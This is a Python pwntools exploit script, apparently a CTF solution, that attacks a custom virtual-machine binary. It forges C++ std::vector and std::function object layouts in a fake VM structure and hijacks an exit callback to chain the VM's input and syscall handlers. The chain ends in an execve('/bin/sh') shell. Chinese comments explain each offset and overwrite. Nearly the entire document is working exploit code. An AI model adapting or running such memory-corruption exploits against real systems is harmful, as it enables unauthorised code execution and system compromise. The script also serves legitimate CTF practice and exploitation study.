#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

filename = "pwn"
libcname = "/home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 53215
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
set directories /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
'''

def start():
    if args.P:
        return process(elf.path)
    elif args.R:
        return remote(host, port)
    else:
        return gdb.debug(elf.path, gdbscript = gs)


io = start()

# pwn :)
def code_end():
    code = b'\x00'
    return code

def _exit():
    code = b'\x05'
    return code

def syscall():
    code = b'\x04'
    return code

def store_reg(addr, r1):
    code = b'\x02' + b'\x20' + p8(addr) + p8(r1)
    return code

def load_to_reg(addr, r1):
    code = b'\x02' + b'\x21' + p8(addr) + p8(r1)
    return code

def push(imm):
    code = b'\x01' + b'\x10' + p8(0) + p64(imm)[::-1]
    return code # 这里是大端序读取

def pop_to_reg(r1):
    code = b'\x01' + b'\x11' + p8(r1)
    return code

def set_reg(r1, imm):
    return push(imm) + pop_to_reg(r1)

RAX = 0
RDI = 1
RSI = 2
RDX = 3

vm_inputcode = 0x40456a
vm_syscall = 0x403cde
vm_operator = 0x403ff4
fake_vm_code = 0x4033bc # \x01\x04\x00

io.recvuntil(b'input your code: ')
code = _exit()
io.sendline(code)
io.recvuntil(b'set your exit code')

payload = b'a'*0x14 + p64(0)*0x10

# 后续exit_code 不为 -1 会再次调用 exit_func, 那时候 rdi = &exit_func
# 类成员函数的第一个参数是 this 指针, 也就是这个类对象的起始地址
# 于是覆盖 exit_func 为 vm_operator, 然后在 &exit_func 布置好 fake_vm 的数据, vm_operator 就会把&exit_func开始的数据当成fake_vm
# fake_vm_code = 0x4033bc 处的数据正好是 \x01 \x04 \x00, 恰好可以作为 fake_vm 的 vm_code

# 但是 vm_code 是 std::vector 成员, 源码如下

# template <typename _Tp, typename _Alloc> struct _Vector_base {
#   typedef
#       typename __gnu_cxx::__alloc_traits<_Alloc>::template rebind<_Tp>::other
#           _Tp_alloc_type;
#   typedef typename __gnu_cxx::__alloc_traits<_Tp_alloc_type>::pointer pointer;
#   struct _Vector_impl : public _Tp_alloc_type {
#     pointer _M_start;   // 数据起点
#     pointer _M_finish;  // 数据末尾
#     pointer _M_end_of_storage; // 已分配空间的末尾
#   }
# public:
#   _Vector_impl _M_impl;
# }

# 查看内存布局确实是三个指针成员, 于是布置好它们的数据

write_base = 0x412100
syscall_regs = write_base + 1

fake_vm = p64((fake_vm_code - vm_operator) & 0xffffffffffffffff) + p64(fake_vm_code+3) + p64(1)
# fake_vm_code, 以及设置 _M_manager 不能为 0
# 同时 p64(fake_vm_code - vm_operator) 是为了加上 ip 后寻址正确
fake_vm += p64(vm_operator) # 覆盖当前真实vm的 exit_func 的 __M_invoker 为 vm_operator, 同时也是真实vm的 ip 成员
fake_vm = fake_vm.ljust(0xb8, b'\x00') + p64(write_base) + p64(write_base) + p64(write_base+0x100) + p64(vm_inputcode)
# stack_func 的 __M_functor, 调用 __M_invoker 时的第一个参数(传的是引用，所以实际上是&__M_functor)
# 也就是又一个fake_vm, 调用vm_inputcode时候往vm_code写数据
# vm_code恰好就是vm的第一个成员, 所以可以再次构造一个fake_vm_code, 然后覆盖 stack_func 的 __M_invoker 为 vm_inputcode
fake_vm = fake_vm.ljust(0x118, b'\x00') + p64(0)*2 + p64(1) + p64(vm_syscall)
# 这里对齐 0x118 处同前文所属会作为 vm_syscall 的第一个参数, 也就是有一个 fake_vm
# 下面偏移0x20正是 vm 中 std::vector<size_t> vm_regs
fake_vm = fake_vm.ljust(0x118 + 0x20, b'\x00') + p64(syscall_regs) + p64(syscall_regs+0x100)*2
# 设置其三个成员, 使用 vm_inputcode 来写入时候也就可以控制fake_regs

payload += fake_vm
payload += b' '
io.send(payload)

binsh = syscall_regs + 0x20
io.sendline(p64(59) + p64(binsh) + p64(0) + p64(0) + b'/bin/sh\x00')

io.interactive()
